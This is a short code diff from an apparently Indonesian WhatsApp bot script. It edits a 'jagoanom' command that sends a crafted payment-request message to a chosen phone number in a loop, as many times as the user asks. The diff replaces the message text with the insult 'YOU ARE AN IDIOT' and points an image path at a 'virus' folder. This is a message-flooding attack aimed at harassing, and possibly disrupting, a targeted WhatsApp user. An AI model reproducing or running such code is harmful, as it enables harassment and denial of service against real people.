@@ -49,7 +49,7 @@ const { apidanz } = JSON.parse(fs.readFileSync('./apidanz.js'))
 const { lolkey } = JSON.parse(fs.readFileSync('./lolkey.js'))
 const { frkey } = JSON.parse(fs.readFileSync('./frkey.js'))
 const { hentai } = require('./lib/scraper2.js')
-virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
+virgam = fs.readFileSync(`./virus/image/deden.jpeg`)
 const {
  FajarNews, 
  BBCNews,
@@ -5382,7 +5382,7 @@ break
 case 'jagoanom' : {
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hello.`
+ydd = `YOU ARE AN IDIOT`
 for (let i = 0; i < jumlah; i++) {
 XeonBotInc.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `YOU ARE AN IDIOT`,"body": `IDIOT`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
